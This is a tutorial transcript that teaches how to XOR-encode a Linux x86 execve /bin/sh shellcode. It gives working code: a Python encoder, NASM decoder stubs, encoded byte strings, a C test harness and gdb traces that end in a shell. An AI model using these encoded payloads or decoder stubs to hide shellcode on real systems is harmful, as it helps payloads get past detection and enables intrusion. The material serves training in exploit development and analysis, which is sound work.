#XOR Encoder and Decoder

Hello students! In this video we will start working with our first
encoder, decoder which is a `xor` operation.

```
(A xor B) xor B = A
```

and this is a very intersting property.

Now, what does this mean for us? Well, we can select in the most
simplest case a single encoder byte let say `0xAA` and `xor` every
byte of the Shellcode with `0xAA`.

Now, this would give us output encoded shellcode and then we would 
need to write decoder which will `xor` this encoded shellcode again
with `0xAA` by byte and this would give us back the original shellcode.

Now, once decoder recovers original shellcode all we have to do is pass
control to the decoded original shellcode. And that's it, your 
shellcode runs just as before. 

In program we write the **xor decoder stub** and in the most common
cases prepended to the encoded shellcode.

```
---------------------------------------------
| XOR Decoder Stub | Encoded Shellcode ...  |
---------------------------------------------
```

And what XOR Decoder Stub does is it works on the shellcode and decodes
it in memory to give us back the original shellcode. Now, after this
is done Decoder Stub **passes control** to the Original Shellcode which
has been decoded now and then our original shellcode runs.

So now let's go ahead and do all of these in a step by step way.

I will use the shellcode which we have already created. So let me use
`execve-stack.nasm` which execs `/bin/sh`.

```asm
global _start

section .text
_start:

        xor eax, eax
        push eax

        push 0x68732f2f
        push 0x6e69622f

        mov ebx, esp

        push eax
        mov edx, esp

        push ebx

        mov ecx, esp

        mov al, 0xb
        int 0x80
```

Let me go ahead and compile it

```
nasm -f elf32 execve-stack.nasm
ld -o execve-stack execve-stack.o
```

Now, let me go ahead and extract the shellcode from this

```
$ shellcode-dump.sh execve-stack
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

Let's verify that shellcode works

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
```

```
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

```
osboxes@osboxes:~/SLAE-Code/Shellcode/XOR-Encoder$ ./shellcode 
Shellcode Length:  25
$ 
```

Now what we need to do is `xor` the original shellcode with `0xAA` by
byte. So what I've done is I've written very simple python script
`XOR-encoder.py` where I can paste the shellcode

```py
#!/usr/bin/env python2

#Python XOR encoder

shellcode=""

encoded=""
encoded2=""

for x in bytearray(shellcode):
	#XOR encoding
	y = x^0xAA
	encoded += '\\x'
	encoded += '%02x' % y
	
	encoded2 += '0x'
	encoded2 += '%02x,' %y

print encoded

print encoded2

print 'Len: %d' % len(bytearray(shellcode)) 
```

Now, the only thing you need to remember is that the byte value you
are using for xor encode **can not be** something which already exists
in the shellcode. And the reason is `xor`ing the encoding byte will
result in 0x00. So this only thing you need to verify that's all OK.

So let me run it with my shellcode

```
$ ./XOREncoder.py Encoded shellcode ...
\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a
0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a,
Len: 25
```

The second we will use in `nasm`. So let me go ahead and write
`xor-decoder.nasm` from scratch

```
global _start

section .text
_start:

```

Let me first paste the shellcode 

```asm
global _start

section .text
_start:






        Shellcode: db 0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a
```

there we go. Now what I am going to do is I am basically going to 
write the decoder stub. So of course the first thing our decoder would
require is to figure out where exactly `Shellcode` sitting in the
program memory. And we will use the same JMP-CALL-POP technique to
find this out. So let me write out this skeleton

```asm
global _start

section .text
_start:

        jmp short call_decoder

decoder:



call_decoder:

        call decoder

        Shellcode: db 0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a
```

Now we can get the address of `Shellcode` by simply doing a `pop` on 
any of the registers. Let's do it on `esi`.

```asm
global _start

section .text
_start:

        jmp short call_decoder

decoder:
        pop esi


call_decoder:

        call decoder

        Shellcode: db 0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a
```

Now, if you go ahead and look at the length of the shellcode. The 
length has been given 25. Which means we need basically start from
the `Shellcode` and `xor` 25 times. So this is exactly what we are
going to do right now. I will use `loop` instruction which means
I need to load up the `ecx` register with 25. So

```asm
global _start

section .text
_start:

        jmp short call_decoder

decoder:
        pop esi
        xor ecx, ecx
        mov cl, 25

decode:
        xor byte [esi], 0xAA
        inc esi
		loop decode

call_decoder:

        call decoder

        Shellcode: db 0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a
```

And what this means is after 25 you would come off the loop and all
we need to do is 

```
jmp short Shellcode
```

```asm
global _start

section .text
_start:

        jmp short call_decoder

decoder:
        pop esi
        xor ecx, ecx
        mov cl, 25

decode:
        xor byte [esi], 0xAA
        inc esi
        loop decode

        jmp short Shellcode


call_decoder:

        call decoder

        Shellcode: db 0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a
```

here we go. Let me go ahead and compile it

```
nasm -f elf32 xor-decoder.nasm
ld -o xor-decoder xor-decoder.o
```

Let's use `objdump` just to verify that we don't have any NULLs in 
there anywhere.

```
$ objdump -d xor-decoder -M intel 

xor-decoder:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:	eb 0d                	jmp    804806f <call_decoder>

08048062 <decoder>:
 8048062:	5e                   	pop    esi
 8048063:	31 c9                	xor    ecx,ecx
 8048065:	b1 19                	mov    cl,0x19

08048067 <decode>:
 8048067:	80 36 aa             	xor    BYTE PTR [esi],0xaa
 804806a:	46                   	inc    esi
 804806b:	e2 fa                	loop   8048067 <decode>
 804806d:	eb 05                	jmp    8048074 <Shellcode>

0804806f <call_decoder>:
 804806f:	e8 ee ff ff ff       	call   8048062 <decoder>

08048074 <Shellcode>:
 8048074:	9b                   	fwait
 8048075:	6a fa                	push   0xfffffffa
 8048077:	c2 85 85             	ret    0x8585
 804807a:	d9 c2                	fld    st(2)
 804807c:	c2 85 c8             	ret    0xc885
 804807f:	c3                   	ret    
 8048080:	c4 23                	les    esp,FWORD PTR [ebx]
 8048082:	49                   	dec    ecx
 8048083:	fa                   	cli    
 8048084:	23 48 f9             	and    ecx,DWORD PTR [eax-0x7]
 8048087:	23 4b 1a             	and    ecx,DWORD PTR [ebx+0x1a]
 804808a:	a1                   	.byte 0xa1
 804808b:	67                   	addr16
 804808c:	2a                   	.byte 0x2a
```

Ok, no NULLs, fantastic. Let's extract the shellcode

```
$ shellcode-dump.sh xor-decoder
"\xeb\x0d\x5e\x31\xc9\xb1\x19\x80\x36\xaa\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a"
```

And test in `shellcode.c`

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x0d\x5e\x31\xc9\xb1\x19\x80\x36\xaa\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a";

main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
```

compile this

```
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

and run it

```
osboxes@osboxes:~/SLAE-Code/Shellcode/XOR-Encoder$ ./shellcode 
Shellcode Length:  45
$ 
$ 
$ 
```

So now you have the XOR decoder which decodes the encoded shellcode
and then passes control to it.

Now, before I move into analysis with gdb we could one small
modification or we rewrite decoder in slightly different way. How
is that? Well, one of the things which we had done is we statically
passed the length of the shellcode. Let's modify `xor-decoder.nasm`
to `xor-decoder-marker.nasm`.

And what I am going to do is at the end of `Shellcode` I will add 
0xaa. Now what is going to happen? Well, what we could just go ahead
and do is keep XORing each of the byte of `Shellcode` with 0xaa. And
the moment when `xor` ends up in a zero value we know that we've hit
the last byte. Because 0xaa is going to be a marker. And that's 
exactly what I am going to do here. 

I say if it is zero then jump to the `Shellcode`

```asm
global _start

section .text
_start:

        jmp short call_decoder

decoder:
        pop esi

decode:
        xor byte [esi], 0xAA
        jz Shellcode
        inc esi
        jmp short decode

call_decoder:

        call decoder

        Shellcode: db 0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a,0xaa
```

So now what happens is we keep moving along with the whole length of
encoded shellcode, finally when we hit 0xaa the `xor` ends up in a
zero value and that sets the Zero Flag and hands `jz Shellcode` and
transfer goes to the `Shellcode`. If not, we keeping incrementing 
`esi` and keep decoding more and more the encoded shellcode.

Now, let's compile and get the shellcode

```
nasm -f elf32 xor-decoder-marker.nasm
ld -o xor-decoder-marker xor-decoder-marker.o
shellcode-dump.sh xor-decoder-marker
"\xeb\x09\x5e\x80\x36\xaa\x74\x08\x46\xeb\xf8\xe8\xf2\xff\xff\xff\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a\xaa"
```

paste it on the `shellcode.c`

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x09\x5e\x80\x36\xaa\x74\x08\x46\xeb\xf8\xe8\xf2\xff\xff\xff\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a\xaa";

main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
```

and compile it

```
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

run

```
osboxes@osboxes:~/SLAE-Code/Shellcode/XOR-Encoder$ ./shellcode 
Shellcode Length:  42
$ 
$ 
$
```

and there we go. Just another way of going ahead and doing it.
Ok, we have this fun. Now let's try analyze the shellcode using gdb.
What I really want is to see that decoding happening in real time.
So that really be fun. Let me load up gdb

```
gdb -q ./shellcode
```

```
(gdb) set disassembly-flavor intel
(gdb) print/x &code
$1 = 0x804a040
```

and we basically want to setup breakpoint at this value

```
(gdb) break *0x804a040
Breakpoint 1 at 0x804a040
(gdb) run
```

```
(gdb) disassemble 
Dump of assembler code for function code:
=> 0x0804a040 <+0>:	jmp    0x804a04b <code+11>
   0x0804a042 <+2>:	pop    esi
   0x0804a043 <+3>:	xor    BYTE PTR [esi],0xaa
   0x0804a046 <+6>:	je     0x804a050 <code+16>
   0x0804a048 <+8>:	inc    esi
   0x0804a049 <+9>:	jmp    0x804a043 <code+3>
   0x0804a04b <+11>:	call   0x804a042 <code+2>
   0x0804a050 <+16>:	fwait
   0x0804a051 <+17>:	push   0xfffffffa
   0x0804a053 <+19>:	ret    0x8585
   0x0804a056 <+22>:	fld    st(2)
   0x0804a058 <+24>:	ret    0xc885
   0x0804a05b <+27>:	ret    
   0x0804a05c <+28>:	les    esp,FWORD PTR [ebx]
   0x0804a05e <+30>:	dec    ecx
   0x0804a05f <+31>:	cli    
   0x0804a060 <+32>:	and    ecx,DWORD PTR [eax-0x7]
   0x0804a063 <+35>:	and    ecx,DWORD PTR [ebx+0x1a]
   0x0804a066 <+38>:	mov    eax,ds:0xaa2a67
End of assembler dump.
```

here we are right at the beginning of our shellcode. Now, if you 
notice basically the place where our shellcode starts is here

```
   0x0804a050 <+16>:	fwait
   0x0804a051 <+17>:	push   0xfffffffa
   0x0804a053 <+19>:	ret    0x8585
   0x0804a056 <+22>:	fld    st(2)
   0x0804a058 <+24>:	ret    0xc885
   0x0804a05b <+27>:	ret    
   0x0804a05c <+28>:	les    esp,FWORD PTR [ebx]
   0x0804a05e <+30>:	dec    ecx
   0x0804a05f <+31>:	cli    
   0x0804a060 <+32>:	and    ecx,DWORD PTR [eax-0x7]
   0x0804a063 <+35>:	and    ecx,DWORD PTR [ebx+0x1a]
   0x0804a066 <+38>:	mov    eax,ds:0xaa2a67
End of assembler dump.
```

and we could figure this out, just go ahead and

```
(gdb) shell cat shellcode.c 
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x09\x5e\x80\x36\xaa\x74\x08\x46\xeb\xf8\xe8\xf2\xff\xff\xff\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a\xaa";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```

and then I am going to show byte by byte 42 individual bytes, then 
we see the address just below the `call` instruction (0x0804a050),
let me take this address.

```
(gdb) x/42xb 0x0804a050
0x804a050 <code+16>:	0x9b	0x6a	0xfa	0xc2	0x85	0x85	0xd9	0xc2
0x804a058 <code+24>:	0xc2	0x85	0xc8	0xc3	0xc4	0x23	0x49	0xfa
0x804a060 <code+32>:	0x23	0x48	0xf9	0x23	0x4b	0x1a	0xa1	0x67
0x804a068 <code+40>:	0x2a	0xaa	0x00	0x00	0x00	0x00	0x00	0x00
0x804a070 <dtor_idx.6161>:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804a078:	0x00	0x00
```

and if you notice this is where this is a part of our shellcode.

So couple of things which we can do. The other thing is also to see
how the instructions changes after the decoding happens.

```
(gdb) x/10i 0x804a050
   0x804a050 <code+16>:	fwait
   0x804a051 <code+17>:	push   0xfffffffa
   0x804a053 <code+19>:	ret    0x8585
   0x804a056 <code+22>:	fld    st(2)
   0x804a058 <code+24>:	ret    0xc885
   0x804a05b <code+27>:	ret    
   0x804a05c <code+28>:	les    esp,FWORD PTR [ebx]
   0x804a05e <code+30>:	dec    ecx
   0x804a05f <code+31>:	cli    
   0x804a060 <code+32>:	and    ecx,DWORD PTR [eax-0x7]
```

now it's a garbage because we are trying to interpret the encoded
part of the shellcode. Ok, so now let me quickly write `hook-stop`

```
(gdb) define hook-stop
>disassemble 
>x/10i 0x804a050
>x/xb 0x804a050
>end
```

```
(gdb) disassemble 
Dump of assembler code for function code:
=> 0x0804a040 <+0>:	jmp    0x804a04b <code+11>
   0x0804a042 <+2>:	pop    esi
   0x0804a043 <+3>:	xor    BYTE PTR [esi],0xaa
   0x0804a046 <+6>:	je     0x804a050 <code+16>
   0x0804a048 <+8>:	inc    esi
   0x0804a049 <+9>:	jmp    0x804a043 <code+3>
   0x0804a04b <+11>:	call   0x804a042 <code+2>
   0x0804a050 <+16>:	fwait
   0x0804a051 <+17>:	push   0xfffffffa
   0x0804a053 <+19>:	ret    0x8585
   0x0804a056 <+22>:	fld    st(2)
   0x0804a058 <+24>:	ret    0xc885
   0x0804a05b <+27>:	ret    
   0x0804a05c <+28>:	les    esp,FWORD PTR [ebx]
   0x0804a05e <+30>:	dec    ecx
   0x0804a05f <+31>:	cli    
   0x0804a060 <+32>:	and    ecx,DWORD PTR [eax-0x7]
   0x0804a063 <+35>:	and    ecx,DWORD PTR [ebx+0x1a]
   0x0804a066 <+38>:	mov    eax,ds:0xaa2a67
End of assembler dump.
```

```
(gdb) stepi
```

Now let's basically keep moving forward what we really want is coming
to a loop, so let's keep moving forward.

So here is where `xor` is going to happen in the next step

```
(gdb) stepi
Dump of assembler code for function code:
   0x0804a040 <+0>:	jmp    0x804a04b <code+11>
   0x0804a042 <+2>:	pop    esi
=> 0x0804a043 <+3>:	xor    BYTE PTR [esi],0xaa
   0x0804a046 <+6>:	je     0x804a050 <code+16>
   0x0804a048 <+8>:	inc    esi
   0x0804a049 <+9>:	jmp    0x804a043 <code+3>
   0x0804a04b <+11>:	call   0x804a042 <code+2>
   0x0804a050 <+16>:	fwait
   0x0804a051 <+17>:	push   0xfffffffa
   0x0804a053 <+19>:	ret    0x8585
   0x0804a056 <+22>:	fld    st(2)
   0x0804a058 <+24>:	ret    0xc885
   0x0804a05b <+27>:	ret    
   0x0804a05c <+28>:	les    esp,FWORD PTR [ebx]
   0x0804a05e <+30>:	dec    ecx
   0x0804a05f <+31>:	cli    
   0x0804a060 <+32>:	and    ecx,DWORD PTR [eax-0x7]
   0x0804a063 <+35>:	and    ecx,DWORD PTR [ebx+0x1a]
   0x0804a066 <+38>:	mov    eax,ds:0xaa2a67
End of assembler dump.
   0x804a050 <code+16>:	fwait
   0x804a051 <code+17>:	push   0xfffffffa
   0x804a053 <code+19>:	ret    0x8585
   0x804a056 <code+22>:	fld    st(2)
   0x804a058 <code+24>:	ret    0xc885
   0x804a05b <code+27>:	ret    
   0x804a05c <code+28>:	les    esp,FWORD PTR [ebx]
   0x804a05e <code+30>:	dec    ecx
   0x804a05f <code+31>:	cli    
   0x804a060 <code+32>:	and    ecx,DWORD PTR [eax-0x7]
0x804a050 <code+16>:	0x9b
0x0804a043 in code ()
```

And that is exactly what we would like to see.

```
(gdb) stepi
Dump of assembler code for function code:
   0x0804a040 <+0>:	jmp    0x804a04b <code+11>
   0x0804a042 <+2>:	pop    esi
   0x0804a043 <+3>:	xor    BYTE PTR [esi],0xaa
=> 0x0804a046 <+6>:	je     0x804a050 <code+16>
   0x0804a048 <+8>:	inc    esi
   0x0804a049 <+9>:	jmp    0x804a043 <code+3>
   0x0804a04b <+11>:	call   0x804a042 <code+2>
   0x0804a050 <+16>:	xor    DWORD PTR [edx-0x6],ebp
   0x0804a053 <+19>:	ret    0x8585
   0x0804a056 <+22>:	fld    st(2)
   0x0804a058 <+24>:	ret    0xc885
   0x0804a05b <+27>:	ret    
   0x0804a05c <+28>:	les    esp,FWORD PTR [ebx]
   0x0804a05e <+30>:	dec    ecx
   0x0804a05f <+31>:	cli    
   0x0804a060 <+32>:	and    ecx,DWORD PTR [eax-0x7]
   0x0804a063 <+35>:	and    ecx,DWORD PTR [ebx+0x1a]
   0x0804a066 <+38>:	mov    eax,ds:0xaa2a67
End of assembler dump.
   0x804a050 <code+16>:	xor    DWORD PTR [edx-0x6],ebp
   0x804a053 <code+19>:	ret    0x8585
   0x804a056 <code+22>:	fld    st(2)
   0x804a058 <code+24>:	ret    0xc885
   0x804a05b <code+27>:	ret    
   0x804a05c <code+28>:	les    esp,FWORD PTR [ebx]
   0x804a05e <code+30>:	dec    ecx
   0x804a05f <code+31>:	cli    
   0x804a060 <code+32>:	and    ecx,DWORD PTR [eax-0x7]
   0x804a063 <code+35>:	and    ecx,DWORD PTR [ebx+0x1a]
0x804a050 <code+16>:	0x31
0x0804a046 in code ()
```

And let me actually keep stepping a little bit more. Let's setup a
breakpoint to the address 0x804a050 of our encoded shellcode.

```
(gdb) break *0x804a050
(gdb) c
Continuing.
Dump of assembler code for function code:
   0x0804a040 <+0>:	jmp    0x804a04b <code+11>
   0x0804a042 <+2>:	pop    esi
   0x0804a043 <+3>:	xor    BYTE PTR [esi],0xaa
   0x0804a046 <+6>:	je     0x804a050 <code+16>
   0x0804a048 <+8>:	inc    esi
   0x0804a049 <+9>:	jmp    0x804a043 <code+3>
   0x0804a04b <+11>:	call   0x804a042 <code+2>
=> 0x0804a050 <+16>:	xor    eax,eax
   0x0804a052 <+18>:	push   eax
   0x0804a053 <+19>:	push   0x68732f2f
   0x0804a058 <+24>:	push   0x6e69622f
   0x0804a05d <+29>:	mov    ebx,esp
   0x0804a05f <+31>:	push   eax
   0x0804a060 <+32>:	mov    edx,esp
   0x0804a062 <+34>:	push   ebx
   0x0804a063 <+35>:	mov    ecx,esp
   0x0804a065 <+37>:	mov    al,0xb
   0x0804a067 <+39>:	int    0x80
   0x0804a069 <+41>:	add    BYTE PTR [eax],al
End of assembler dump.
=> 0x804a050 <code+16>:	xor    eax,eax
   0x804a052 <code+18>:	push   eax
   0x804a053 <code+19>:	push   0x68732f2f
   0x804a058 <code+24>:	push   0x6e69622f
   0x804a05d <code+29>:	mov    ebx,esp
   0x804a05f <code+31>:	push   eax
   0x804a060 <code+32>:	mov    edx,esp
   0x804a062 <code+34>:	push   ebx
   0x804a063 <code+35>:	mov    ecx,esp
   0x804a065 <code+37>:	mov    al,0xb
0x804a050 <code+16>:	0x31
```

Because I know as soon as decoding of my shellcode happens that there
where control goes. And now notice something extremly interesting, you
would notice that all garbage down below which was there

```
=> 0x804a050 <code+16>:	xor    eax,eax
   0x804a052 <code+18>:	push   eax
   0x804a053 <code+19>:	push   0x68732f2f
   0x804a058 <code+24>:	push   0x6e69622f
   0x804a05d <code+29>:	mov    ebx,esp
   0x804a05f <code+31>:	push   eax
   0x804a060 <code+32>:	mov    edx,esp
   0x804a062 <code+34>:	push   ebx
   0x804a063 <code+35>:	mov    ecx,esp
   0x804a065 <code+37>:	mov    al,0xb
   0x0804a067 <+39>:    int    0x80
   0x0804a069 <+41>:    add    BYTE PTR [eax],al
```

is now fantastically decoded into what our original 
`execve-stack.nasm` shellcode. Can you see that? So all of that
now has been decoded and then the control has been passed to this
location after **decoder stub**.

So now we can continue

```
(gdb) c
Continuing.
process 8011 is executing new program: /bin/dash
$ 
```

and basically we get a shell which we can exit.

So hopefully now all this steps are clear and I would really encourage
you to use gdb to go through this exactly the way which I have done. 
The best part is that once you understand how the decoding and all of 
that happens and you are able to trace through all of that. You 
practically be able to understand most other decoders out there.



